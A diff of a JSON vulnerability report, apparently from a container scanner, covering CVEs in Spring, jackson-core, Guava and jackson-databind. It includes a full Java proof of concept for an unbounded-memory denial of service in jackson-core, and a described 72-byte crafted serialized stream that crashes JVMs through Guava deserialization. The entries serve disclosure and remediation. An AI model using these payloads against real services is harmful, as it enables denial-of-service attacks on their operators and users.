@@ -1,6 +1,14 @@
 [
   {
     "severity": "CRITICAL",
+    "source_id": "CVE-2026-47890",
+    "vulnerable_range": ">=7.0.0,<=7.0.8",
+    "fixed_by": "7.0.9",
+    "url": "https://scout.docker.com/v/CVE-2026-47890?s=github&n=spring-webmvc&ns=org.springframework&t=maven&vr=%3E%3D7.0.0%2C%3C%3D7.0.8",
+    "description": "Spring MVC and WebFlux applications are vulnerable to stream corruption when using Server-Sent Events (SSE) with view fragments.\nSpring Framework 7.0.0 - 7.0.8\nSpring Framework 6.2.0 - 6.2.19"
+  },
+  {
+    "severity": "CRITICAL",
     "source_id": "CVE-2026-47884",
     "vulnerable_range": ">=7.0.0,<=7.0.8",
     "fixed_by": "7.0.9",
@@ -8,12 +16,12 @@
     "description": "Use of XsltView in a Spring MVC application can result in SSRF and RCE attack if the application has an \"/**\" mapping that results in view rendering, and where the view name is not explicitly specified.\nSpring Framework 7.0.0 - 7.0.8\nSpring Framework 6.2.0 - 6.2.19\nSpring Framework 6.1.0 - 6.1.28\nSpring Framework 6.0.0 - 6.0.30\nSpring Framework 5.3.0 - 5.3.49\nSpring Framework 5.2.25.RELEASE and earlier"
   },
   {
-    "severity": "CRITICAL",
-    "source_id": "CVE-2026-47890",
-    "vulnerable_range": ">=7.0.0,<=7.0.8",
-    "fixed_by": "7.0.9",
-    "url": "https://scout.docker.com/v/CVE-2026-47890?s=github&n=spring-webmvc&ns=org.springframework&t=maven&vr=%3E%3D7.0.0%2C%3C%3D7.0.8",
-    "description": "Spring MVC and WebFlux applications are vulnerable to stream corruption when using Server-Sent Events (SSE) with view fragments.\nSpring Framework 7.0.0 - 7.0.8\nSpring Framework 6.2.0 - 6.2.19"
+    "severity": "HIGH",
+    "source_id": "CVE-2026-89425",
+    "vulnerable_range": ">=2.19.0,<=2.21.6",
+    "fixed_by": "2.21.7",
+    "url": "https://scout.docker.com/v/CVE-2026-89425?s=github&n=jackson-core&ns=com.fasterxml.jackson.core&t=maven&vr=%3E%3D2.19.0%2C%3C%3D2.21.6",
+    "description": "## Status\n\n**FULLY REPRODUCED.** A malformed token fed through `createParser(DataInput)` produced a\n20,000,109-character exception message from a 20-million-character attacker payload, while the\nidentical payload fed through `createParser(InputStream)` produced a correctly bounded\n367-character message.\n\n## Affected Component / Version\n\n- **Package:** `com.fasterxml.jackson.core:jackson-core`\n- **Confirmed against:** `jackson-core-2.20.2`\n- **Affected file:** `src/main/java/com/fasterxml/jackson/core/json/UTF8DataInputJsonParser.java`\n  (`_reportInvalidToken(int, String, String)`, lines ~2763-2780 in the 2.20.2 tree)\n\n## Technical Analysis\n\n`UTF8DataInputJsonParser._reportInvalidToken()` builds the offending-token description for its\nexception message by appending identifier characters one at a time to a bare `StringBuilder`:\n\n```java\nprotected void _reportInvalidToken(int ch, String matchedPart, String msg) throws IOException {\n    StringBuilder sb = new StringBuilder(matchedPart);\n    while (true) {\n        char c = (char) _decodeCharForError(ch);\n        if (!Character.isJavaIdentifierPart(c)) {\n            break;\n        }\n        sb.append(c);\n        ch = _inputData.readUnsignedByte();\n    }\n    _reportError(\"Unrecognized token '\"+sb.toString()+\"': was expecting \"+msg);\n}\n```\n\nThere is **no check against `ErrorReportConfiguration.getMaxErrorTokenLength()`** (default 256)\nanywhere in this loop. By contrast, the sibling `UTF8StreamJsonParser` implementation of the\nsame logic does enforce it:\n\n```java\n// UTF8StreamJsonParser.java (control, correctly bounded)\nif (sb.length() >= _ioContext.errorReportConfiguration().getMaxErrorTokenLength()) {\n    sb.append(\"...\");\n    break;\n}\n```\n\n`ReaderBasedJsonParser` and `NonBlockingUtf8JsonParserBase` also correctly enforce the limit —\nthis is a defect isolated to the `DataInput`-backed implementation specifically, confirmed by\ndirect comparison of all four parser implementations in this tree.\n\nThis path is additionally left with **no fallback control**: because of `[core#1570]`-related\nlogic in `JsonFactory`, configuring `maxDocumentLength` causes `DataInput`-sourced parser\ncreation to be rejected outright, so a document-length backstop cannot coexist with this input\nsource, and the identifier-character accumulation never passes through\n`ReadConstrainedTextBuffer`, so `maxStringLength` does not apply either. There is no\nconfiguration an application can set to mitigate this specific path.\n\n## Reproduction Procedure\n\nSame clone/build steps as `jackson-core_1_...md`. Then:\n\n```bash\nCP=\"build/classes:build/lib/fastdoubleparser-2.0.1.jar\"\njavac -cp \"$CP\" -d poc poc/PoC6_UnboundedErrorTokenStringBuilder.java\njava -Xmx2g -cp \"poc:$CP\" PoC6_UnboundedErrorTokenStringBuilder\n```\n\n## Full PoC Source (`poc/PoC6_UnboundedErrorTokenStringBuilder.java`)\n\n```java\nimport com.fasterxml.jackson.core.*;\n\nimport java.io.DataInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\n\npublic class PoC6_UnboundedErrorTokenStringBuilder {\n\n    static class RepeatingByteInputStream extends InputStream {\n        private final int b;\n        private long remaining;\n        RepeatingByteInputStream(int b, long count) { this.b = b; this.remaining = count; }\n        @Override public int read() {\n            if (remaining <= 0) return -1;\n            remaining--;\n            return b;\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        final long IDENTIFIER_CHAR_COUNT = 20_000_000L;\n\n        System.out.println(\"Malformed token: \\\"t\\\" followed by \" + IDENTIFIER_CHAR_COUNT\n                + \" Java-identifier characters ('x'), then a terminating space, never completing\"\n                + \" \\\"true\\\"/\\\"false\\\"/\\\"null\\\"/NaN.\\n\");\n\n        System.out.println(\"=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===\");\n        {\n            InputStream raw = concat3(\"{\\\"a\\\": t\".getBytes(\"UTF-8\"),\n                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), \" }\".getBytes(\"UTF-8\"));\n            DataInputStream dataIn = new DataInputStream(raw);\n            JsonFactory factory = new JsonFactory();\n            JsonParser p = factory.createParser((java.io.DataInput) dataIn);\n\n            long heapBefore = usedHeap();\n            long t0 = System.nanoTime();\n            String message = null;\n            try {\n                p.nextToken(); p.nextToken(); p.nextToken();\n            } catch (JsonParseException e) {\n                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();\n            } catch (IOException e) {\n                message = \"(stream ended: \" + e + \")\";\n            }\n            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;\n            long heapAfter = usedHeap();\n\n            int msgLen = message == null ? -1 : message.length();\n            System.out.println(\"Exception message length: \" + msgLen + \" characters\");\n            System.out.println(\"Elapsed time: \" + elapsedMs + \" ms\");\n            System.out.println(\"Approx additional heap used: \" + ((heapAfter - heapBefore) / (1024 * 1024)) + \" MB\");\n            System.out.println(\"Message length proportional to the full \" + IDENTIFIER_CHAR_COUNT\n                    + \"-character payload (unbounded)? \" + (msgLen > 1_000_000));\n        }\n\n        System.out.println(\"\\n=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===\");\n        {\n            InputStream raw = concat3(\"{\\\"a\\\": t\".getBytes(\"UTF-8\"),\n                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), \" }\".getBytes(\"UTF-8\"));\n            JsonFactory factory = new JsonFactory();\n            JsonParser p = factory.createParser(raw);\n\n            long t0 = System.nanoTime();\n            String message = null;\n            try {\n                p.nextToken(); p.nextToken(); p.nextToken();\n            } catch (JsonParseException e) {\n                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();\n            } catch (IOException e) {\n                message = \"(stream ended: \" + e + \")\";\n            }\n            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;\n            int msgLen = message == null ? -1 : message.length();\n            System.out.println(\"Exception message length: \" + msgLen + \" characters\");\n            System.out.println(\"Elapsed time: \" + elapsedMs + \" ms\");\n            System.out.println(\"Message length bounded near default maxErrorTokenLength (256)? \" + (msgLen < 500));\n        }\n    }\n\n    static InputStream concat3(byte[] prefix, InputStream middle, byte[] suffix) {\n        InputStream first = new java.io.SequenceInputStream(new java.io.ByteArrayInputStream(prefix), middle);\n        return new java.io.SequenceInputStream(first, new java.io.ByteArrayInputStream(suffix));\n    }\n\n    static long usedHeap() {\n        Runtime rt = Runtime.getRuntime();\n        System.gc();\n        return rt.totalMemory() - rt.freeMemory();\n    }\n}\n```\n\n## Captured Evidence (actual run output)\n\n```\nMalformed token: \"t\" followed by 20000000 Java-identifier characters ('x'), then a terminating\nspace, never completing \"true\"/\"false\"/\"null\"/NaN.\n\n=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===\nException message length: 20000109 characters\nElapsed time: 81 ms\nApprox additional heap used (best-effort, GC-noisy): 38 MB\nMessage length is proportional to the full 20000000-character attacker payload (unbounded)? true\n\n=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===\nException message length: 367 characters\nElapsed time: 7 ms\nMessage length bounded near ErrorReportConfiguration.getMaxErrorTokenLength() (default 256)? true\n```\n\nThe same 20-million-character malformed token, fed to the two parser variants, produces a\n367-character message via the correctly-bounded `InputStream` path and a 20,000,109-character\nmessage via the vulnerable `DataInput` path — a difference of roughly 54,500x for identical\ninput, confirming the missing bound is the sole cause of the difference.\n\n## Impact\n\nAny application creating parsers via `JsonFactory.createParser(DataInput)` over\nattacker-supplied input (a fully public, documented API) is exposed to unbounded memory growth\nfrom a single malformed token. Scaling the payload from the 20MB demonstrated here to\ngigabytes (well within a typical unbounded request body) would drive the accumulated\n`StringBuilder` — which additionally undergoes byte-to-char expansion and internal doubling —\nto consume many times the raw payload size, realistically triggering `OutOfMemoryError` and\ndenying service to the whole JVM process. Critically, **no available configuration mitigates\nthis**: `maxDocumentLength` cannot be set for `DataInput` sources at all, and `maxStringLength`\ndoes not apply to this code path.\n\n## Remediation\n\n1. Add the `maxErrorTokenLength` check to the append loop in\n   `UTF8DataInputJsonParser._reportInvalidToken()`, appending `\"...\"` and breaking when the\n   limit is reached — mirroring the three other parser implementations exactly.\n2. Add a parameterized regression test across all four parser implementations asserting the\n   exception message length is bounded by `maxErrorTokenLength` plus a small constant.\n3. Consider extracting this bounded-scan logic into a single shared helper on\n   `ParserMinimalBase` to prevent this class of per-implementation drift recurring."
   },
   {
     "severity": "HIGH",
@@ -25,11 +33,11 @@
   },
   {
     "severity": "HIGH",
-    "source_id": "CVE-2026-89425",
-    "vulnerable_range": ">=2.19.0,<=2.21.6",
-    "fixed_by": "2.21.7",
-    "url": "https://scout.docker.com/v/CVE-2026-89425?s=github&n=jackson-core&ns=com.fasterxml.jackson.core&t=maven&vr=%3E%3D2.19.0%2C%3C%3D2.21.6",
-    "description": "## Status\n\n**FULLY REPRODUCED.** A malformed token fed through `createParser(DataInput)` produced a\n20,000,109-character exception message from a 20-million-character attacker payload, while the\nidentical payload fed through `createParser(InputStream)` produced a correctly bounded\n367-character message.\n\n## Affected Component / Version\n\n- **Package:** `com.fasterxml.jackson.core:jackson-core`\n- **Confirmed against:** `jackson-core-2.20.2`\n- **Affected file:** `src/main/java/com/fasterxml/jackson/core/json/UTF8DataInputJsonParser.java`\n  (`_reportInvalidToken(int, String, String)`, lines ~2763-2780 in the 2.20.2 tree)\n\n## Technical Analysis\n\n`UTF8DataInputJsonParser._reportInvalidToken()` builds the offending-token description for its\nexception message by appending identifier characters one at a time to a bare `StringBuilder`:\n\n```java\nprotected void _reportInvalidToken(int ch, String matchedPart, String msg) throws IOException {\n    StringBuilder sb = new StringBuilder(matchedPart);\n    while (true) {\n        char c = (char) _decodeCharForError(ch);\n        if (!Character.isJavaIdentifierPart(c)) {\n            break;\n        }\n        sb.append(c);\n        ch = _inputData.readUnsignedByte();\n    }\n    _reportError(\"Unrecognized token '\"+sb.toString()+\"': was expecting \"+msg);\n}\n```\n\nThere is **no check against `ErrorReportConfiguration.getMaxErrorTokenLength()`** (default 256)\nanywhere in this loop. By contrast, the sibling `UTF8StreamJsonParser` implementation of the\nsame logic does enforce it:\n\n```java\n// UTF8StreamJsonParser.java (control, correctly bounded)\nif (sb.length() >= _ioContext.errorReportConfiguration().getMaxErrorTokenLength()) {\n    sb.append(\"...\");\n    break;\n}\n```\n\n`ReaderBasedJsonParser` and `NonBlockingUtf8JsonParserBase` also correctly enforce the limit —\nthis is a defect isolated to the `DataInput`-backed implementation specifically, confirmed by\ndirect comparison of all four parser implementations in this tree.\n\nThis path is additionally left with **no fallback control**: because of `[core#1570]`-related\nlogic in `JsonFactory`, configuring `maxDocumentLength` causes `DataInput`-sourced parser\ncreation to be rejected outright, so a document-length backstop cannot coexist with this input\nsource, and the identifier-character accumulation never passes through\n`ReadConstrainedTextBuffer`, so `maxStringLength` does not apply either. There is no\nconfiguration an application can set to mitigate this specific path.\n\n## Reproduction Procedure\n\nSame clone/build steps as `jackson-core_1_...md`. Then:\n\n```bash\nCP=\"build/classes:build/lib/fastdoubleparser-2.0.1.jar\"\njavac -cp \"$CP\" -d poc poc/PoC6_UnboundedErrorTokenStringBuilder.java\njava -Xmx2g -cp \"poc:$CP\" PoC6_UnboundedErrorTokenStringBuilder\n```\n\n## Full PoC Source (`poc/PoC6_UnboundedErrorTokenStringBuilder.java`)\n\n```java\nimport com.fasterxml.jackson.core.*;\n\nimport java.io.DataInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\n\npublic class PoC6_UnboundedErrorTokenStringBuilder {\n\n    static class RepeatingByteInputStream extends InputStream {\n        private final int b;\n        private long remaining;\n        RepeatingByteInputStream(int b, long count) { this.b = b; this.remaining = count; }\n        @Override public int read() {\n            if (remaining <= 0) return -1;\n            remaining--;\n            return b;\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        final long IDENTIFIER_CHAR_COUNT = 20_000_000L;\n\n        System.out.println(\"Malformed token: \\\"t\\\" followed by \" + IDENTIFIER_CHAR_COUNT\n                + \" Java-identifier characters ('x'), then a terminating space, never completing\"\n                + \" \\\"true\\\"/\\\"false\\\"/\\\"null\\\"/NaN.\\n\");\n\n        System.out.println(\"=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===\");\n        {\n            InputStream raw = concat3(\"{\\\"a\\\": t\".getBytes(\"UTF-8\"),\n                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), \" }\".getBytes(\"UTF-8\"));\n            DataInputStream dataIn = new DataInputStream(raw);\n            JsonFactory factory = new JsonFactory();\n            JsonParser p = factory.createParser((java.io.DataInput) dataIn);\n\n            long heapBefore = usedHeap();\n            long t0 = System.nanoTime();\n            String message = null;\n            try {\n                p.nextToken(); p.nextToken(); p.nextToken();\n            } catch (JsonParseException e) {\n                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();\n            } catch (IOException e) {\n                message = \"(stream ended: \" + e + \")\";\n            }\n            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;\n            long heapAfter = usedHeap();\n\n            int msgLen = message == null ? -1 : message.length();\n            System.out.println(\"Exception message length: \" + msgLen + \" characters\");\n            System.out.println(\"Elapsed time: \" + elapsedMs + \" ms\");\n            System.out.println(\"Approx additional heap used: \" + ((heapAfter - heapBefore) / (1024 * 1024)) + \" MB\");\n            System.out.println(\"Message length proportional to the full \" + IDENTIFIER_CHAR_COUNT\n                    + \"-character payload (unbounded)? \" + (msgLen > 1_000_000));\n        }\n\n        System.out.println(\"\\n=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===\");\n        {\n            InputStream raw = concat3(\"{\\\"a\\\": t\".getBytes(\"UTF-8\"),\n                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), \" }\".getBytes(\"UTF-8\"));\n            JsonFactory factory = new JsonFactory();\n            JsonParser p = factory.createParser(raw);\n\n            long t0 = System.nanoTime();\n            String message = null;\n            try {\n                p.nextToken(); p.nextToken(); p.nextToken();\n            } catch (JsonParseException e) {\n                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();\n            } catch (IOException e) {\n                message = \"(stream ended: \" + e + \")\";\n            }\n            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;\n            int msgLen = message == null ? -1 : message.length();\n            System.out.println(\"Exception message length: \" + msgLen + \" characters\");\n            System.out.println(\"Elapsed time: \" + elapsedMs + \" ms\");\n            System.out.println(\"Message length bounded near default maxErrorTokenLength (256)? \" + (msgLen < 500));\n        }\n    }\n\n    static InputStream concat3(byte[] prefix, InputStream middle, byte[] suffix) {\n        InputStream first = new java.io.SequenceInputStream(new java.io.ByteArrayInputStream(prefix), middle);\n        return new java.io.SequenceInputStream(first, new java.io.ByteArrayInputStream(suffix));\n    }\n\n    static long usedHeap() {\n        Runtime rt = Runtime.getRuntime();\n        System.gc();\n        return rt.totalMemory() - rt.freeMemory();\n    }\n}\n```\n\n## Captured Evidence (actual run output)\n\n```\nMalformed token: \"t\" followed by 20000000 Java-identifier characters ('x'), then a terminating\nspace, never completing \"true\"/\"false\"/\"null\"/NaN.\n\n=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===\nException message length: 20000109 characters\nElapsed time: 81 ms\nApprox additional heap used (best-effort, GC-noisy): 38 MB\nMessage length is proportional to the full 20000000-character attacker payload (unbounded)? true\n\n=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===\nException message length: 367 characters\nElapsed time: 7 ms\nMessage length bounded near ErrorReportConfiguration.getMaxErrorTokenLength() (default 256)? true\n```\n\nThe same 20-million-character malformed token, fed to the two parser variants, produces a\n367-character message via the correctly-bounded `InputStream` path and a 20,000,109-character\nmessage via the vulnerable `DataInput` path — a difference of roughly 54,500x for identical\ninput, confirming the missing bound is the sole cause of the difference.\n\n## Impact\n\nAny application creating parsers via `JsonFactory.createParser(DataInput)` over\nattacker-supplied input (a fully public, documented API) is exposed to unbounded memory growth\nfrom a single malformed token. Scaling the payload from the 20MB demonstrated here to\ngigabytes (well within a typical unbounded request body) would drive the accumulated\n`StringBuilder` — which additionally undergoes byte-to-char expansion and internal doubling —\nto consume many times the raw payload size, realistically triggering `OutOfMemoryError` and\ndenying service to the whole JVM process. Critically, **no available configuration mitigates\nthis**: `maxDocumentLength` cannot be set for `DataInput` sources at all, and `maxStringLength`\ndoes not apply to this code path.\n\n## Remediation\n\n1. Add the `maxErrorTokenLength` check to the append loop in\n   `UTF8DataInputJsonParser._reportInvalidToken()`, appending `\"...\"` and breaking when the\n   limit is reached — mirroring the three other parser implementations exactly.\n2. Add a parameterized regression test across all four parser implementations asserting the\n   exception message length is bounded by `maxErrorTokenLength` plus a small constant.\n3. Consider extracting this bounded-scan logic into a single shared helper on\n   `ParserMinimalBase` to prevent this class of per-implementation drift recurring."
+    "source_id": "CVE-2026-102554",
+    "vulnerable_range": ">=4.0,<=33.7.1",
+    "fixed_by": "33.7.2",
+    "url": "https://scout.docker.com/v/CVE-2026-102554?s=github&n=guava&ns=com.google.guava&t=maven&vr=%3E%3D4.0%2C%3C%3D33.7.1",
+    "description": "# CompactHashMap/CompactHashSet/MapMakerInternalMap native deserialization triggers uncontrolled memory allocation\n\n## Summary\n\n`CompactHashMap`, `CompactHashSet`, and `MapMakerInternalMap` implement `readObject(ObjectInputStream)` by reading an attacker-controlled `elementCount` or `initialCapacity` from the stream. On the very first insertion during or after deserialization (for the `CompactHash*` collections, inside `allocArrays()`) or immediately during deserialization (for `MapMakerInternalMap`), the implementation eagerly allocates arrays sized to that full, unvalidated value (up to `CompactHashing.MAX_SIZE` = 2^30-1, ~1.07 billion, for example) before the rest of the stream's actual content has been consumed. A 72-byte malicious serialized stream containing a single tiny element can force a multi-gigabyte allocation and crash a JVM with `OutOfMemoryError`, dynamically confirmed against the current release.\n\n## Details\n\n`CompactHashMap.readObject()` (`guava/src/com/google/common/collect/CompactHashMap.java`):\n\n```java\nprivate void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException {\n  stream.defaultReadObject();\n  int elementCount = stream.readInt();\n  if (elementCount < 0) {\n    throw new InvalidObjectException(\"Invalid size: \" + elementCount);\n  }\n  init(elementCount);\n  for (int i = 0; i < elementCount; i++) {\n    K key = (K) stream.readObject();\n    V value = (V) stream.readObject();\n    put(key, value);\n  }\n}\n```\n\n`elementCount` is only checked for being non-negative; there is no upper bound and no relationship enforced between the declared count and how much data actually follows in the stream. `init(elementCount)` (line 251) just stores the value (clamped to `[1, CompactHashing.MAX_SIZE]`, i.e. up to 2^30-1):\n\n```java\nvoid init(int expectedSize) {\n  Preconditions.checkArgument(expectedSize >= 0, \"Expected size must be >= 0\");\n  this.metadata = Ints.constrainToRange(expectedSize, 1, CompactHashing.MAX_SIZE);\n}\n```\n\nThe real allocation is deferred to `allocArrays()`, which fires lazily on the *first* `put()` call — i.e. after only one key/value pair has actually been read off the wire:\n\n```java\nint allocArrays() {\n  ...\n  int expectedSize = metadata;\n  int buckets = CompactHashing.tableSize(expectedSize);\n  this.table = CompactHashing.createTable(buckets);\n  setHashTableMask(buckets - 1);\n  this.entries = new int[expectedSize];\n  this.keys = new Object[expectedSize];\n  this.values = new Object[expectedSize];\n  return expectedSize;\n}\n```\n\nWith `expectedSize` near `CompactHashing.MAX_SIZE` (2^30-1), this single call allocates a hash `table` plus three `expectedSize`-length arrays — multiple gigabytes — triggered by a stream that has, at that point, only supplied one small real element. `CompactHashSet.readObject()`/`allocArrays()` have the identical shape. `CompactLinkedHashMap`/`CompactLinkedHashSet` extend these classes and inherit the same unguarded path.\n\nThe problem with `MapMakerInternalMap` is similar, with [a size read from the serialized data and stored in a `MapMaker` instance](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2848-L2851) for [later user during deserialization](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2897), when [the `MapMaker` is passed back to `MapMakerInternalMap`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMaker.java#L287) and [segments are allocated](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L173-L200) by [calling `newSegment`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1143), whose implementations ([example](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L443)) create `Segment` instances ([example](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2019)) that [allocate arrays of the requested capacity](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1234) through [the `newTable`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1262) helper.\n\nThis is the same amplification shape as the already-fixed **CVE-2018-10237** (`AtomicDoubleArray`/`CompoundOrdering`: attacker declares a large size, library eagerly allocates before validating against actual stream content). That fix rewrote `AtomicDoubleArray.readObject()` to grow an `ImmutableLongArray.Builder` incrementally per element actually read, rather than pre-allocating from the declared size — Guava's own `HashBiMap.readObject()` documents the same defensive principle explicitly in a comment: `init(16); // resist hostile attempts to allocate gratuitous heap`. `CompactHashMap`/`CompactHashSet` do not follow either of these two patterns already present elsewhere in the same codebase.\n\n**Reachability**: All classes are top-level, `implements ... Serializable`, and require no special classpath setup beyond Guava being present (near-ubiquitous on JVM backends). A native Java deserialization attacker names the class directly in a hand-crafted stream — no particular Guava factory method needs to have been used by the victim application, exactly as with the precedent CVE.\n\n## PoC\n\nFull source and run instructions in the attached `poc-guava-compacthash-dos.zip` (Maven project, `guava:33.7.1-jre` — the current latest release — as the only dependency). The PoC:\n\n1. Uses reflection only to legitimately obtain a `CompactHashSet` instance (it is package-private; a real attacker does not need this step, since they craft the serialized bytes directly rather than calling Guava's own serialization code).\n2. Serializes one set with 1 element and one with 2 elements, diffs the two byte streams to locate the exact offset of the `elementCount` field (byte-precise, not guessed).\n3. Patches that one 4-byte field in the 1-element stream from `1` to `0x3FFFFFFF` (`CompactHashing.MAX_SIZE`), leaving the rest of the 72-byte stream (one real `\"A\"` element) untouched.\n4. Feeds the resulting 72-byte malicious stream into a plain `new ObjectInputStream(...).readObject()` call against the real, unmodified `guava-33.7.1-jre.jar`.\n\nActual run output:\n\n```\n### -Xmx8g (generous heap) ###\nLocated size field at offset 63, value=1 (expected 1)\nMalicious stream size: 72 bytes\nDeclared elementCount: 1073741823 (~1.07 billion)\nReal payload: 1 tiny string element (\"A\")\n=== RESULT ===\nException: java.lang.OutOfMemoryError: Java heap space\nTime to allocate+fail: 4013 ms\nHeap used before: 3 MB\nHeap used after (at failure point): 4103 MB\nJVM max heap (-Xmx): 8192 MB\n\n### -Xmx128m (ordinary service-sized heap) ###\nLocated size field at offset 63, value=1 (expected 1)\nMalicious stream size: 72 bytes\nDeclared elementCount: 1073741823 (~1.07 billion)\nReal payload: 1 tiny string element (\"A\")\n=== RESULT ===\nException: java.lang.OutOfMemoryError: Java heap space\nTime to allocate+fail: 24 ms\nHeap used before: 4 MB\nHeap used after (at failure point): 2 MB\nJVM max heap (-Xmx): 128 MB\n```\n\nA 72-byte input forces ~4.1 GB of real allocation before failing on an 8 GB heap, and crashes a 128 MB heap in 24 ms — over 50,000x amplification between input size and forced allocation.\n\nTo reproduce: `mvn -q compile dependency:build-classpath -Dmdep.outputFile=cp.txt && java -Xmx128m -cp \"target/classes:$(cat cp.txt)\" poc.Poc`\n\n## Impact\n\nUncontrolled resource consumption (CWE-770 / CWE-400) via native Java deserialization: any application that runs `ObjectInputStream.readObject()` on data reachable by an attacker, and has Guava on its classpath (true for a large fraction of the JVM ecosystem), can be crashed with a single ~72-byte payload, regardless of what type the application itself expected to deserialize.\n\n## Severity\n\nCVSS 3.1: `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H` — identical vector to CVE-2018-10237, the precedent this is a sibling of. Recomputed with the full formula: exploitability = 8.22×0.85×0.44×0.85×0.85 = 2.221; ISS = 1-(1×1×0.44) = 0.56; impact = 6.42×0.56 = 3.595; base = roundup(5.816) = **5.9 (Medium)**.\n\n## Affected\n\n`com.google.guava:guava`, all editions (`-jre`/`-android`) — confirmed on the current latest release, 33.7.1-jre. `CompactHashMap`/`CompactHashSet`/`CompactLinkedHashMap`/`CompactLinkedHashSet` have had this same `readObject`/`allocArrays` shape for a long time (probably since they were added in Guava 23.6), and similarly for `MapMakerInternalMap` (which was introduced in Guava 4.0); not tested against older individual releases.\n\n## Suggested fix\n\nApply the same defense already used elsewhere in this codebase: either clamp the initial `init()` capacity to a small constant regardless of the declared `elementCount` (as `HashBiMap.readObject()` already does — `init(16); // resist hostile attempts to allocate gratuitous heap`) and grow incrementally as elements are actually read, or grow the backing arrays incrementally per iteration of the deserialization loop (as the fixed `AtomicDoubleArray.readObject()` does via `ImmutableLongArray.Builder`) instead of eagerly sizing to the full attacker-declared count on first insert."
   },
   {
     "severity": "HIGH",
@@ -48,20 +56,244 @@
     "description": "### Summary\n\nWith `@JsonTypeInfo(use = Id.NAME, defaultImpl = ...)`, every distinct unknown\nraw type ID selects the same fallback deserializer but is retained as a\nseparate key in `TypeDeserializerBase._deserializers`. An attacker who can\nrepeatedly supply new unknown type IDs can grow this process-lifetime cache\nwithout a configured bound.\n\n### Details\n\nThe affected path is `TypeDeserializerBase._findDeserializer()`. After an\nunknown name-based type ID resolves to the configured fallback/default\nimplementation, jackson-databind caches the result under the attacker-provided\nraw `typeId`. Although all such IDs select the same fallback deserializer, each\nnew string remains a distinct cache key.\n\nThe behavior is runtime-confirmed in jackson-databind 2.22.1 and 3.2.1.\nCurrent 2.22 and 3.2 source branches retained the unbounded `_deserializers`\nmap and per-raw-ID cache write when rechecked. The earlier affected floor has\nnot been established, patched versions are: 2.18.11, 2.21.7, 2.22.3, 3.1.7 and 3.2.3.\n\nThe vulnerable application must enable name-based polymorphism with a\n`defaultImpl` or equivalent fallback, accept attacker-influenced type IDs, and\nreuse a long-lived mapper/type deserializer across requests.\n\nSuggested correction: avoid caching each unknown raw ID when every such ID\nresolves to the same fallback, use a fallback sentinel, or use an explicitly\nbounded concurrency-safe cache. A regression should contrast many distinct\nunknown IDs with repetitions of one unknown ID across requests.\n\n### PoC\n\nConfigure a polymorphic base type with\n`@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, defaultImpl = Fallback.class)` and\ndeserialize inputs containing unknown type names through the same mapper.\nInspect `TypeDeserializerBase._deserializers` after the run.\n\nOn affected 2.x and 3.x versions, 10,000 distinct unknown raw type IDs produce\n10,000 retained cache entries even though every input selects the same\nfallback deserializer. A matched control that repeats one unknown ID 10,000\ntimes produces one retained entry. This isolates attacker-controlled key\ncardinality from ordinary request count.\n\n### Impact\n\nWhere the stated polymorphic fallback configuration is exposed to\nattacker-influenced type IDs, distinct inputs cause incremental\nprocess-lifetime memory retention and eventual availability pressure or\ndenial of service. This is not claimed as a single-request allocation spike,\nand no fixed bytes-per-ID or time-to-out-of-memory value is asserted. No\nconfidentiality, integrity, or code-execution impact is claimed.\n\nRequested credit: Daniel Birtwhistle"
   },
   {
-    "severity": "HIGH",
-    "source_id": "CVE-2026-102554",
-    "vulnerable_range": ">=4.0,<=33.7.1",
-    "fixed_by": "33.7.2",
-    "url": "https://scout.docker.com/v/CVE-2026-102554?s=github&n=guava&ns=com.google.guava&t=maven&vr=%3E%3D4.0%2C%3C%3D33.7.1",
